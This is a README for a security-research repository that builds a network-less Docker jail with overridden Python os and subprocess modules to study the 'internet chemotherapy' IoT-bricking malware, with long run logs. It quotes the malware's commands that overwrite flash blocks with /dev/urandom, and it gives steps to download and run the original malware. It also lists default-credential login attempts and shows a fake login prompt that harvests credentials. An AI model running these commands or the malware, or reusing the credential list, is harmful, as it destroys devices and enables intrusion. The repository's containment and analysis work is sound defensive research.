IoT - Nerfball
==============

This repository was built as a thought experiment in learning how to defend against attacks and exploits from python-based threats. I built this specifically to learn how internet chemotherapy worked and how to defend against it. I hope others will find it valuable when they try to defend against something like this in the future.

After reviewing how the code worked, I built a jail to help me **nerf what I didn't need.** By disabling the system's python calls the container has a reduced surface area for this type of application to do something bad. Please note, even the approach outlined in this repository is not perfect for all types of threats or new ones in the future. 

Why did you build it?
---------------------

I did not know of a tool to inspect hacks like this where untrusted code was in play that could easily destroy my own property if I screwed up. This repository is how I built the jail and crafted it to inspect the python system calls as they ran on the host operating system. After the system access audit passed the unittests, I started to feel comfortable that I could debug with less chance of something going bad while learning how it worked.

Why does this matter?
---------------------

This is an approach to reduce python's ability to be able to do bad things on the host when running untrusted code (control your python runtime surface area). It also shows how to control the system's python utilities so you can still change the underlying host api calls if needed (the tests use environment variables to toggle calls on and off). It also shows how potentially aggressive this code appears to be in this early testing phase.

Please note this code is for educational purposes and not tested against all known threats. Please see the `Disclaimers and Warnings`_ section for more details.

**Please explore these types of threats with care.**

.. _Disclaimers and Warnings: https://github.com/jay-johnson/nerfball/README.rst#Disclaimers and Warnings

Disclaimers and Warnings
========================

DEVELOPMENT ONLY - NON-PRODUCTION USAGE
---------------------------------------

- **This repository is not intended for production use.** It is used for educational purposes and is not tested against all possible threats. It is used for learning how to defend against attacks... PLEASE be careful and clone at your own risk!

- This repository builds a jail to tests threats and learn how they work. `Jails get compromised`_ and this has not been tested with other threats to see if it will work in containing an untested, and unknown, active threat within your own host and network. Please contact me if you would like to research something not covered here in a controlled environment.

- By using this tool you acknowledge and accept all risks that come from **trying to build a non-complete jail** to hold software that can break out and destroy, brick, modify and infect your laptop(s), desktop(s), server(s), vm(s), host(s), IoT device(s), your own devices (phones, wifi-access points), your own network, your neighbors' device(s), install ransomware, install malware, install viruses, steal your own account credentials. I accept no legal responsbility or liability for you using this tool beyond reading and viewing how I learned how a specific list of threats tried to compromise IoT devices. 

- When you clone or download this repository you acknowledge you are using a repository with tools to download a known, claimed threat onto your own host. You accept responsibilities for knowing that you are downloading a threat into the network. **I am not responsible if you get fired, sued or worse from using a tool that could violate security, liability or any contract agreements**. Please know where you are running this tool before cloning, developing, testing or building the jail.

- This tool will not work on threats that it was not tested on.

- This is a repository that you should use at your own risk. The original content claims this code disabled millions of IoT devices. Treat this as an active piece of malware that should not be trusted.

Initial Observations
--------------------

These will be updated as I continue finding out more how this works and what type of mitigation strategies start to emerge.

The repo downloads the GitHub-hosted internet chemotherapy source code from the third party repository:
https://raw.githubusercontent.com/JeremyNGalloway/mod_plaintext.py/f671e74c688ab06e48d8ab0bde5d949afe75fd86/mod_plaintext.py

- Reverse engineering is time consuming and scary when your hardware is in use. So far the code appears to operate as a single-file, standalone python 2.7 application with one main component.
- It utilizes low-level python networking sockets (this makes sense as most of these libraries are commonly installed by default on most linux-like operating systems)
- It is a single python module that does not work natively on python 3 - that's why I went with python 3 instead of 2 when building this first version
- It does not have a list of imports that it requires - I used cat and grep to figure out what was going on
- Make sure this does not run anywhere with any network access
- Make sure this code does not run on a non-nerfed python runtime
- Use python 3 instead of python 2 to ensure all connectivity api calls will likely require python 3 byte handling fixes (https://stackoverflow.com/questions/14472650/python-3-encode-decode-vs-bytes-str)
- Make sure it does not run on a system using flash-based storage. Here's how it tries to brick flash disks:

::

    'busybox cat /dev/urandom >/dev/mtdblock0;busybox cat /dev/urandom >/dev/mtdblock1;busybox cat /dev/urandom >/dev/mtdblock2;busybox cat /dev/urandom >/dev/mtdblock3;busybox cat /dev/urandom >/dev/mtdblock4;busybox cat /dev/urandom >/dev/mtdblock5' ,
    'busybox cat /dev/urandom >/dev/mtdblock0;busybox cat /dev/urandom >/dev/mtdblock1;busybox cat /dev/urandom >/dev/mtdblock2;busybox cat /dev/urandom >/dev/mtdblock3;busybox cat /dev/urandom >/dev/mtdblock4;busybox cat /dev/urandom >/dev/mtdblock5 &' ,
    'cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/mtdblock4;cat /dev/urandom >/dev/mtdblock5' ,
    'cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/mtdblock4;cat /dev/urandom >/dev/mtdblock5 &' ,

- How can we control this untrusted code? I wanted to figure out a way to control how the python module interfaced with the host VM. This led to overriding and disabling most of the common os-interfacing api calls to prevent how that code could get a chance to brick/delete or destory my local vm.

Note about subprocess exploits
------------------------------

I created a python 3 subprocess.py module to override the default `cpython shared object subprocess`_. I mention this because I am not certain pathing is not going to be a problem when there is a loading order that the code is not explicitly controlling. This probably can be exploited and should be monitored with caution.

.. _cpython shared object subprocess: https://github.com/python/cpython/blob/3.6/Lib/subprocess.py

Overview and Concepts
---------------------

#.  Sentinel - Main

    The main server loop that manages and orchestrates connectivity and can be configured using an optional local config file (if present). This component can create, manage and read and write over a list of configurable sockets. It is also capable of emulating customized ssh servers which could trick users into logging in to this host like a man-in-the-middle attack. I can imagine there is some tooling that has not been released that deploys this software to emulate the device it just hacked and then it waits for a tech to login to figure out what happened. On login, the malware gets new credentials to try as it scans for new devices to exploit.

#.  Device Identification and Specific Exploits

    The code appears to utilize sockets to login. Once connected it tries to brick devices by sending flash-erasing and network-disabling commands mapped to specific devices. Given how many IoT devices are using flash storage this makes sense as one of the vulnerable resources to target. It also looks like it uses response banner discovery (regex) to detect the device type which helps identify the list of vulnerabilities to try. Exploit-login attempts have a configurable back-off retry timer to reduce the velocity of failed login attempts and which helps reduce the power usage on one these compromised devices. Keeping the lights on longer makes sense as well after getting installed.

.. _Jails get compromised: https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/

How do I get started?
---------------------

#.  Setup the virtualenv 

    If you want to use python 3:

    ::

        virtualenv -p python3 venv && source venv/bin/activate && pip install -e .

    Python 2 - coming soon

Build the Nerfball
------------------

Before building the nerfball please take a moment to review what this does from a security perspective:

1. Build - create a python 3.6 alpine docker container image on disk
2. Install - install dependencies and nerfball pip inside this repository into a controllable virtual environment
3. Nerf - install customized python modules (os.py, imp.py, subprocess.py and importlib) into the virtual environment
4. **Download Malware/Virus Source Code**

^ Please note this repository contains code to download a known, claimed threat which will be on your host. Please be careful where you are using this or even cloning the repo. Are you inside a corporate intranet or on a vpn? Then this is probably a **bad idea**.

#.  Build

    It takes a few minutes to build

    ::

        ./build.sh

#.  Confirm Image is Ready

    ::

        $ docker ps | grep nerfball
        REPOSITORY                              TAG                 IMAGE ID            CREATED             SIZE
        jayjohnson/nerfball                     1.0.0               0ad82713e196        About an hour ago   490 MB
        jayjohnson/nerfball                     latest              0ad82713e196        About an hour ago   490 MB

Start the Nerfball Jail 
-----------------------

This uses docker-compose (installed in the virtual environment) to start a docker container that has `CAPs disabled`_ and `no network connection`_ to the outside world. By default, the compose file has the python runtime NERFs enabled, but for testing purposes there is an environment file for running the python unittests from within the nerf jail to confirm they can be turned off (commands like ``pip list`` do not work correctly with NERFs enabled).

.. _CAPs disabled: https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities
.. _no network connection: https://docs.docker.com/compose/compose-file/#network_mode

#.  Start

    ::

        ./start.sh

Explore Bad Stuff
-----------------

#.  SSH into the Nerfball

    From another terminal in the repository's base directory, ssh into the docker container.

    ::

        ./ssh.sh

#.  Change to the "Bad Stuff" directory

    ::

        cd /opt/badstuff

#.  Examine the contents

    ::

        ls

#.  Run Bad Stuff

    Please be careful with this next command, as it is running something that may destroy your laptop, desktop, and everything else listed in the `Disclaimers and Warnings`_ section.

    Note: I am not planning on sharing a nerfed, fixed version of the code so the container uses the vanilla, original version of the code that I have not modified. 
    
    Before running it on your machine, please review the rest of the snippets below from my work-in-progress version running in the nerfball docker container. The latest virus configuration I am testing appears to be running the ssh/telnet emulator accessible on tcp port ``2323``. This server appears to host a randomized login prompt emulating devices that are targeted for the brick-a-device exploits. 
    
    Once an incoming client connection is detected on port ``2323`` it will trigger sending an exploit over a socket (on port 9000). I have slowed down the internal server loop to read how it works by reviewing the log output and captured the stdout shell output below. Please be careful with this code, I did not know it was phishing for logins using this approach until tonight (12/31/2017). Additionally I created a ``listen-on-port.py`` that will auto-reply to any of the exploits sent over port 9000 after the telnet session connects within the docker container.

    ::

        print("-----------------------------------------------------")
        print("TEST connecting to port={}".format(use_target_port))
        use_socket_for_login_attempt.connect(("0.0.0.0", int(use_target_port)))
        use_socket_for_login_attempt.send(b'This could be an incoming exploit attack here')
        print("TEST DONE connecting to port={}".format(use_target_port))
        print("-----------------------------------------------------")

    .. _Disclaimers and Warnings: https://github.com/jay-johnson/nerfball/README.rst#Disclaimers and Warnings

#.  Start python server that will be be targeted by one of the exploits

    From a new terminal session in the base repository directory, ssh into the nerfball.

    ::

        ./ssh.sh

    Start simple listening server which is the target of these exploits:

    ::

        (venv) root:/opt/nerfball# listen-on-port.py
        os._get_exports_list=posix
        os._exists name=_have_functions
        os._add function label=HAVE_FUTIMESAT fn=utime
        os._add function label=HAVE_FUTIMENS fn=utime
        os._add function label=HAVE_FUTIMES fn=utime
        os._add function label=HAVE_LUTIMES fn=utime
        os._add function label=HAVE_UTIMENSAT fn=utime
        os._exists name=fork
        os._exists name=spawnv
        os._exists name=execv
        os._exists name=spawnv
        os._exists name=spawnvp
        os._exists name=fspath
        os._get_exports_list=_socket
        os - popen cmd=uname -p 2> /dev/null mode=r buffering=-1
        2018-01-01T07:52:00.007266 - Starting Server address=127.0.0.1:9000 backlog=5 size=1024 sleep=0.5 shutdown=/tmp/shutdown-listen-server-127.0.0.1-9000

#.  Prepare Telnet Client
    
    From a new terminal session in the base repository directory, ssh into the nerfball.

    ::

        ./ssh.sh

#.  Start Sentinel

    From a new terminal session in the base repository directory, ssh into the nerfball.

    ::

        ./ssh.sh

    This is my work-in-progress version's logs from a test

    ::

        (venv) root:/opt/nerfball# export NERF_TEST_PORT=9000 && python /opt/badstuff/internet_chemo.py
        os._get_exports_list=posix
        os._exists name=_have_functions
        os._add function label=HAVE_FUTIMESAT fn=utime
        os._add function label=HAVE_FUTIMENS fn=utime
        os._add function label=HAVE_FUTIMES fn=utime
        os._add function label=HAVE_LUTIMES fn=utime
        os._add function label=HAVE_UTIMENSAT fn=utime
        os._exists name=fork
        os._exists name=spawnv
        os._exists name=execv
        os._exists name=spawnv
        os._exists name=spawnvp
        os._exists name=fspath
        os._get_exports_list=_socket
        Booting up
        trying logins=0/36
        trying logins=1/36
        trying logins=2/36
        trying logins=3/36
        trying logins=4/36
        trying logins=5/36
        trying logins=6/36
        trying logins=7/36
        trying logins=8/36
        trying logins=9/36
        trying logins=10/36
        trying logins=11/36
        trying logins=12/36
        trying logins=13/36
        trying logins=14/36
        trying logins=15/36
        trying logins=16/36
        trying logins=17/36
        trying logins=18/36
        trying logins=19/36
        trying logins=20/36
        trying logins=21/36
        trying logins=22/36
        trying logins=23/36
        trying logins=24/36
        trying logins=25/36
        trying logins=26/36
        trying logins=27/36
        trying logins=28/36
        trying logins=29/36
        trying logins=30/36
        trying logins=31/36
        trying logins=32/36
        trying logins=33/36
        trying logins=34/36
        trying logins=35/36
        - trying login=admin:admin
        - trying login=admin:1234
        - trying login=admin:password
        - trying login=admin:
        - trying login=user:user
        - trying login=user:1234
        - trying login=user:
        - trying login=cisco:cisco
        - trying login=Cisco:Cisco
        - trying login=cusadmin:password
        - trying login=admin:admin
        - trying login=admin:admin
        - trying login=admin:admin
        - trying login=admin:admin
        - trying login=admin:admin
        Done: Booting up
        Starting Sentinel file=/tmp/sentinel/control.cfg bootup=True
        starting sentinel with config=/tmp/system/control.cfg
        starting sentinel
        using ports=[2323]
        done starting sentinel
        9000
        NOTC: Sentinel added listening TEST port=9000
        Trying socket logins=1
        login=0/1 START host=0.0.0.0:2323
        login=1/1 DONE host=0.0.0.0:2323
        Sentinel Process Launch (1 listeners)
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=0 writeables=0 exceptions=0

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        process disconnects and restart events
        STAT V: 1 SCT: 0 RSQ: 0 BFJ: 0 WPT: 0 PUT: 0 TRT: 0 XMP: 0
        - Jobs to try=0
        - Jobs to try=[]

    
    The server is set up to sleep for a few seconds to make reading logs easier
    
#.  Use the Telnet Client session to connect on port 2323

    The Sentinel will emulate logging into a server by asking for credentials as well as present a banner.

    ::

        telnet 0.0.0.0 2323

    After a few seconds the randomized login prompt will appear with something like:

    ::

        
        Welcome to VeEX(R) V100-IGM/MPX Console.

        (none) login: admin
        Password: admin

        Login incorrect. Try again.

    or it might be:

    ::

        BCM96318 Broadband Router
        Login: admin
        Password: admin

        Login incorrect. Try again.

    or:

    ::

        Ruijie login: admin
        Password: admin

    or:

    ::

        ralink login: admin
        Password: admin

#.  Verify Sentinel Processed the Client Connection

    ::

        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=0 writeables=0 exceptions=0

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=1 writeables=0 exceptions=0

        -----------------------------------------------------
        TEST connecting to port=9000
        TEST DONE connecting to port=9000
        -----------------------------------------------------

        connect_and_attempt_login_to_ip(<socket.socket fd=5, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 2323), raddr=('127.0.0.1', 60864)>, 127.0.0.1, 2323
        <socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        trying logins over http ct=1514793887.203082 ut=1514793883.981449 val=3.221633195877075
        telnet_try_to_login_over_socket_with_http - socket logins readables=0 writeables=3 exceptions=0
        Socket result code=111
        Socket result code=111
        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=1 writeables=1 exceptions=0

        --------------------------
        Received bytes=2 socket=<socket.socket fd=5, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 2323), raddr=('127.0.0.1', 60864)>


        --------------------------


        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=0 writeables=1 exceptions=0

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        trying logins over http ct=1514793890.3361382 ut=1514793887.203082 val=3.133056163787842
        telnet_try_to_login_over_socket_with_http - socket logins readables=0 writeables=4 exceptions=0
        Socket result code=111
        Socket result code=111
        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=1 writeables=1 exceptions=0

        --------------------------
        Received bytes=2 socket=<socket.socket fd=5, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 2323), raddr=('127.0.0.1', 60864)>


        --------------------------


        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=0 writeables=1 exceptions=0

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=0 writeables=1 exceptions=0

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        trying logins over http ct=1514793893.52531 ut=1514793890.3361382 val=3.18917179107666
        telnet_try_to_login_over_socket_with_http - socket logins readables=0 writeables=5 exceptions=0
        Socket result code=111
        Socket result code=111
        Socket result code=111
        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=0 writeables=1 exceptions=0

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=1 writeables=1 exceptions=0

        --------------------------
        Received bytes=7 socket=<socket.socket fd=5, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 2323), raddr=('127.0.0.1', 60864)>
        admin

        --------------------------

        try_login_using_telnet_socket_and_http - sub and send ex=a bytes-like object is required, not 'str'
        try_login_using_telnet_socket_and_http - send slr + sln ex=a bytes-like object is required, not 'str'

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=0 writeables=1 exceptions=0

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        trying logins over http ct=1514793896.7155027 ut=1514793893.52531 val=3.190192699432373
        telnet_try_to_login_over_socket_with_http - socket logins readables=0 writeables=5 exceptions=0
        Socket result code=111
        Socket result code=111
        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=0 writeables=1 exceptions=0

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=1 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=1 writeables=1 exceptions=0

        --------------------------
        Received bytes=7 socket=<socket.socket fd=5, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 2323), raddr=('127.0.0.1', 60864)>
        admin

        --------------------------


        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=1 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=0 writeables=1 exceptions=0

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=0 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        trying logins over http ct=1514793899.8876593 ut=1514793896.7155027 val=3.172156572341919
        telnet_try_to_login_over_socket_with_http - socket logins readables=0 writeables=3 exceptions=0
        Socket result code=111
        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
        try_login_using_telnet_socket_and_http - socket logins readables=1 writeables=1 exceptions=0

        --------------------------
        Received bytes=2 socket=<socket.socket fd=5, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 2323), raddr=('127.0.0.1', 60864)>


        --------------------------

        127.0.0.1:2323 HP:WelcometoVeEXRV1:%:admin\x0d\x0aadmin\x0d\x0a

        Section 0 - checking sockets=1 status
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]

        Section 1 - socket logins=1 readables=1 writeables=0 exceptions=0

        ---------------------------------------------------------
        Section 2 - Num of sockets=1
        [<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('0.0.0.0', 2323)>]
        ---------------------------------------------------------

        ---------------------------------------------------------
        Section 3 - socket logins readables=0 writeables=0 exceptions=0
        ---------------------------------------------------------

        - Jobs to try=0
        - Jobs to try=[]
        loop
        try_logging_into_device - socket logins readables=0 writeables=0 exceptions=0
        handle_timeouts - socket logins readables=0 writeables=0 exceptions=0
        process_login_sockets_that_have_timedout_or_failed - socket logins readables=0 writeables=0 exceptions=0
        try_to_login_using_socket - socket logins readables=0 writeables=0 exceptions=0
